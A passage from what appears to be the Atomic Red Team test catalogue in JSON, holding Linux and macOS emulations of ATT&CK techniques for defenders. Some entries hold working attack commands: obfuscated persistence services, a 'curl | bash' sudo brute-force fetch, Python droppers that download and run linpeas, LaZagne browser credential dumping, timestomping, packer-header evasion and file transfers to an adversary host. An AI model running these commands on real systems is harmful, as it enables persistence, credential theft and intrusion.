      "command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '#' >> #{rc_service_path}/#{rc_service_file}\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file}\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\necho 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file}\necho 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file}\necho '' >> #{rc_service_path}/#{rc_service_file}\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \necho '{' >> #{rc_service_path}/#{rc_service_file}\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\necho '}' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \necho 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file}\nchmod +x #{rc_service_path}/#{rc_service_file}\nservice art-test enable\nservice art-test start\n",
      "cleanup_command": "sysrc -x art_test_enable\nrm -f #{rc_service_path}/#{rc_service_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "rc_service_path": {
        "description": "Path to rc service file",
        "type": "path",
        "default": "/usr/local/etc/rc.d"
      },
      "rc_service_file": {
        "description": "File name of rc service file",
        "type": "string",
        "default": "art-test"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test creates a SysV service unit file and enables it as a service.\n",
    "indexed_technique": "T1543.002.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1543.002",
    "display_name": "Create or Modify System Process: SysV/Systemd Service",
    "source_file": "T1543.002.yaml",
    "test_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.",
    "test_guid": "c35ac4a8-19de-43af-b9f8-755da7e89c89",
    "description": "This test creates a systemd service unit file (/etc/init.d/T1543.002) and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002\necho \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002\necho \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002\necho \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002\necho \"# Required-Stop : \" >> /etc/init.d/T1543.002\necho \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002\necho \"# Default-Stop: \" >> /etc/init.d/T1543.002\necho \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002\necho \"### END INIT INFO\" >> /etc/init.d/T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi\nsystemctl enable T1543.002\nsystemctl start T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n",
      "cleanup_command": "systemctl stop T1543.002\nsystemctl disable T1543.002\nrm -rf /etc/init.d/T1543.002\nsystemctl daemon-reload\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "System must be Ubuntu ,Kali OR CentOS.\n",
        "prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then exit /b 0; else exit /b 1; fi;\n",
        "get_prereq_command": "echo Please run from Ubuntu ,Kali OR CentOS.\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
    "indexed_technique": "T1543.002.03",
    "technique_index": 3,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1110.001",
    "display_name": "Brute Force: Password Guessing",
    "source_file": "T1110.001.yaml",
    "test_name": "SUDO Brute Force - Debian",
    "test_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700",
    "description": "This test creates a user 'art' with password 'password123' and sudo privileges, downloads sudo_bruteforce.sh from https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh, executes it to brute force the password, and deletes the user.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \"cd /tmp; curl -s #{remote_url} | bash\" art\n",
      "cleanup_command": "userdel -fr art\n"
    },
    "input_arguments": {
      "remote_url": {
        "description": "url of remote payload",
        "type": "url",
        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
      }
    },
    "dependencies": [
      {
        "description": "Check if running on a Debian based machine.\n",
        "prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
        "get_prereq_command": "apt update && apt install -y openssl sudo curl\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
    "indexed_technique": "T1110.001.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1027.002",
    "display_name": "Obfuscated Files or Information: Software Packing",
    "source_file": "T1027.002.yaml",
    "test_name": "Binary simply packed by UPX (linux)",
    "test_guid": "11c46cd8-e471-450e-acb8-52a1216ae6a4",
    "description": "This test copies a UPX-packed binary from PathToAtomicsFolder/T1027.002/bin/linux/test_upx to /tmp/packed_bin and executes it to output 'the cake is a lie'.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
      "cleanup_command": "rm /tmp/packed_bin\n",
      "name": "sh"
    },
    "input_arguments": {
      "bin_path": {
        "description": "Packed binary",
        "type": "path",
        "default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
    "indexed_technique": "T1027.002.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1027.002",
    "display_name": "Obfuscated Files or Information: Software Packing",
    "source_file": "T1027.002.yaml",
    "test_name": "Binary packed by UPX, with modified headers (linux)",
    "test_guid": "f06197f8-ff46-48c2-a0c6-afc1b50665e1",
    "description": "This test copies a UPX-packed binary with modified headers (magic number changed from 'UPX!' to 'LOTR') from PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed to /tmp/packed_bin and executes it to output 'the cake is a lie'.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
      "cleanup_command": "rm /tmp/packed_bin\n",
      "name": "sh"
    },
    "input_arguments": {
      "bin_path": {
        "description": "Packed binary",
        "type": "path",
        "default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
    "indexed_technique": "T1027.002.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.006",
    "display_name": "Indicator Removal on Host: Timestomp",
    "source_file": "T1070.006.yaml",
    "test_name": "Modify file timestamps using reference file",
    "test_guid": "631ea661-d661-44b0-abdb-7a7f3fc08e50",
    "description": "Modifies the `modify` and `access` timestamps uof /tmp/T1070.006-reference.txt to match the timestamps of /bin/sh.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "touch #{target_file_path}\ntouch -acmr #{reference_file_path} #{target_file_path}\n",
      "cleanup_command": "rm -f #{target_file_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "target_file_path": {
        "description": "Path of file to modify timestamps of",
        "type": "path",
        "default": "/tmp/T1070.006-reference.txt"
      },
      "reference_file_path": {
        "description": "Path of reference file to read timestamps from",
        "type": "path",
        "default": "/bin/sh"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
    "indexed_technique": "T1070.006.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1071.001",
    "display_name": "Application Layer Protocol: Web Protocols",
    "source_file": "T1071.001.yaml",
    "test_name": "Malicious User Agents - Nix",
    "test_guid": "2d7c471a-e887-4b78-b0dc-b0df1f2e0658",
    "description": "Uses curl to make several web requests to www.google.com, each with a unique User-Agent string.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "Default domain to simulate against",
        "type": "string",
        "default": "www.google.com"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
    "indexed_technique": "T1071.001.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1555.003",
    "display_name": "Credentials from Password Stores: Credentials from Web Browsers",
    "source_file": "T1555.003.yaml",
    "test_name": "LaZagne.py - Dump Credentials from Firefox Browser",
    "test_guid": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
    "description": "This test uses LaZagne.py from /tmp/LaZagne/Linux to dump Firefox browser credentials on Ubuntu 20.04.4 LTS, saving output to /tmp/firefox_password.txt.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
      "cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "lazagne_path": {
        "description": "Path you put LaZagne Github with LaZagne.py",
        "type": "string",
        "default": "/tmp/LaZagne/Linux"
      },
      "specific_module": {
        "description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
        "type": "string",
        "default": "browsers -firefox"
      },
      "output_file": {
        "description": "This is where output for the Firefox passwords goes",
        "type": "string",
        "default": "/tmp/firefox_password.txt"
      }
    },
    "dependencies": [
      {
        "description": "Get Lazagne from Github and install requirements",
        "prereq_command": "test -f #{lazagne_path}/laZagne.py",
        "get_prereq_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"
      },
      {
        "description": "Needs git, python3 and some pip stuff",
        "prereq_command": "which git && which python3 && which pip",
        "get_prereq_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
    "indexed_technique": "T1555.003.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1059.006",
    "display_name": "Command and Scripting Interpreter: Python",
    "source_file": "T1059.006.yaml",
    "test_name": "Execute shell script via python's command mode arguement",
    "test_guid": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb",
    "description": "Download and execute shell script (https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh) and write to file (T1059.006-payload) then execute locally using Python",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
      "name": "sh",
      "cleanup_command": "rm #{payload_file_name} \npip-autoremove pypykatz >nul 2> nul\n"
    },
    "input_arguments": {
      "script_url": {
        "description": "Shell script public URL",
        "type": "string",
        "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
      },
      "payload_file_name": {
        "description": "Name of shell script downloaded from the script_url",
        "type": "string",
        "default": "T1059.006-payload"
      },
      "executor": {
        "description": "FreeBSD or Linux shell",
        "type": "string",
        "default": "sh"
      },
      "script_args": {
        "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
        "type": "string",
        "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
      }
    },
    "dependencies": [
      {
        "description": "Verify if python is in the environment variable path and attempt to import requests library.",
        "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
        "get_prereq_command": "pip install requests\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
    "indexed_technique": "T1059.006.01",
    "technique_index": 1,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.006",
    "display_name": "Command and Scripting Interpreter: Python",
    "source_file": "T1059.006.yaml",
    "test_name": "Execute Python via scripts",
    "test_guid": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8",
    "description": "Creates a Python file (T1059.006.py) that downloads and executes shell script (https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh) via executor arguments (sh -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles)",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n",
      "name": "sh",
      "cleanup_command": "rm #{python_script_name} #{payload_file_name}  \n"
    },
    "input_arguments": {
      "python_script_name": {
        "description": "Python script name",
        "type": "path",
        "default": "T1059.006.py"
      },
      "script_url": {
        "description": "Shell script public URL",
        "type": "string",
        "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
      },
      "payload_file_name": {
        "description": "Shell script file name downloaded from the script_url",
        "type": "string",
        "default": "T1059.006-payload"
      },
      "executor": {
        "description": "Payload or script interpreter / executor",
        "type": "string",
        "default": "sh"
      },
      "script_args": {
        "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
        "type": "string",
        "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
        "get_prereq_command": "pip install requests    \n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
    "indexed_technique": "T1059.006.02",
    "technique_index": 2,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.006",
    "display_name": "Command and Scripting Interpreter: Python",
    "source_file": "T1059.006.yaml",
    "test_name": "Execute Python via Python executables",
    "test_guid": "0b44d79b-570a-4b27-a31f-3bf2156e5eaa",
    "description": "Create Python file (T1059.006.py) then compile to binary (T1059.006.pyc) that downloads an external script (https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh) then executes locally using the supplied executor and arguments (sh -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles)",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n",
      "name": "sh",
      "cleanup_command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n"
    },
    "input_arguments": {
      "python_script_name": {
        "description": "Name of Python script name",
        "type": "path",
        "default": "T1059.006.py"
      },
      "script_url": {
        "description": "URL hosting external malicious payload",
        "type": "string",
        "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
      },
      "payload_file_name": {
        "description": "Shell script file name downloaded from the script_url",
        "type": "string",
        "default": "T1059.006-payload"
      },
      "executor": {
        "description": "Payload or script interpreter / executor",
        "type": "string",
        "default": "sh"
      },
      "script_args": {
        "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
        "type": "string",
        "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
      },
      "python_binary_name": {
        "description": "Name of Python file to be compiled",
        "type": "path",
        "default": "T1059.006.pyc"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
        "get_prereq_command": "pip install requests    \n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
    "indexed_technique": "T1059.006.03",
    "technique_index": 3,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.006",
    "display_name": "Command and Scripting Interpreter: Python",
    "source_file": "T1059.006.yaml",
    "test_name": "Python pty module and spawn function used to spawn sh or bash",
    "test_guid": "161d694c-b543-4434-85c3-c3a433e33792",
    "description": "This test uses Python's pty.spawn to spawn /bin/sh and /bin/bash shells sequentially.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Verify if python is in the environment variable path and attempt to import requests library.\n",
        "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n",
        "get_prereq_command": "pip install requests\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n",
    "indexed_technique": "T1059.006.04",
    "technique_index": 4,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "rsync remote file copy (push)",
    "test_guid": "0fc6e977-cb12-44f6-b263-2824ba917409",
    "description": "Utilize rsync to perform a remote file copy (push) from /tmp/adversary-rsync/ to victim-host:/tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "remote_path": {
        "description": "Remote path to receive rsync",
        "type": "path",
        "default": "/tmp/victim-files"
      },
      "remote_host": {
        "description": "Remote host to copy toward",
        "type": "string",
        "default": "victim-host"
      },
      "local_path": {
        "description": "Path of folder to copy",
        "type": "path",
        "default": "/tmp/adversary-rsync/"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "victim"
      }
    },
    "dependencies": [
      {
        "description": "rsync must be installed on the machine \n",
        "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Utilize rsync to perform a remote file copy (push)\n",
    "indexed_technique": "T1105.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "rsync remote file copy (pull)",
    "test_guid": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
    "description": "Utilize rsync to perform a remote file copy (pull) from adversary-host:/tmp/adversary-rsync/ to /tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "remote_path": {
        "description": "Path of folder to copy",
        "type": "path",
        "default": "/tmp/adversary-rsync/"
      },
      "remote_host": {
        "description": "Remote host to copy from",
        "type": "string",
        "default": "adversary-host"
      },
      "local_path": {
        "description": "Local path to receive rsync",
        "type": "path",
        "default": "/tmp/victim-files"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "adversary"
      }
    },
    "dependencies": [
      {
        "description": "rsync must be installed on the machine \n",
        "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Utilize rsync to perform a remote file copy (pull)\n",
    "indexed_technique": "T1105.02",
    "technique_index": 2,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "scp remote file copy (push)",
    "test_guid": "83a49600-222b-4866-80a0-37736ad29344",
    "description": "Utilize scp to perform a remote file copy (push) from /tmp/adversary-scp to victim-host:/tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "remote_path": {
        "description": "Remote path to receive scp",
        "type": "path",
        "default": "/tmp/victim-files/"
      },
      "local_file": {
        "description": "Path of file to copy",
        "type": "path",
        "default": "/tmp/adversary-scp"
      },
      "remote_host": {
        "description": "Remote host to copy toward",
        "type": "string",
        "default": "victim-host"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "victim"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize scp to perform a remote file copy (push)\n",
    "indexed_technique": "T1105.03",
    "technique_index": 3,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "scp remote file copy (pull)",
    "test_guid": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
    "description": "Utilize scp to perform a remote file copy (pull) from adversary-host:/tmp/adversary-scp to /tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "remote_host": {
        "description": "Remote host to copy from",
        "type": "string",
        "default": "adversary-host"
      },
      "local_path": {
        "description": "Local path to receive scp",
        "type": "path",
        "default": "/tmp/victim-files/"
      },
      "remote_file": {
        "description": "Path of file to copy",
        "type": "path",
        "default": "/tmp/adversary-scp"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "adversary"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize scp to perform a remote file copy (pull)\n",
    "indexed_technique": "T1105.04",
    "technique_index": 4,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "sftp remote file copy (push)",
    "test_guid": "f564c297-7978-4aa9-b37a-d90477feea4e",
    "description": "Utilize sftp to perform a remote file copy (push) from /tmp/adversary-sftp to victim-host:/tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n",
      "name": "bash"
    },
    "input_arguments": {
      "remote_path": {
        "description": "Remote path to receive sftp",
        "type": "path",
        "default": "/tmp/victim-files/"
      },
      "local_file": {
        "description": "Path of file to copy",
        "type": "path",
        "default": "/tmp/adversary-sftp"
      },
      "remote_host": {
        "description": "Remote host to copy toward",
        "type": "string",
        "default": "victim-host"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "victim"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize sftp to perform a remote file copy (push)\n",
    "indexed_technique": "T1105.05",
    "technique_index": 5,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "sftp remote file copy (pull)",
    "test_guid": "0139dba1-f391-405e-a4f5-f3989f2c88ef",
    "description": "Utilize sftp to perform a remote file copy (pull) from adversary-host:/tmp/adversary-sftp to /tmp/victim-files/",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "remote_host": {
        "description": "Remote host to copy from",
        "type": "string",
        "default": "adversary-host"
      },
      "local_path": {
        "description": "Local path to receive sftp",
        "type": "path",
        "default": "/tmp/victim-files/"
      },
      "remote_file": {
        "description": "Path of file to copy",
        "type": "path",
        "default": "/tmp/adversary-sftp"
      },
      "username": {
        "description": "User account to authenticate on remote host",
        "type": "string",
        "default": "adversary"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
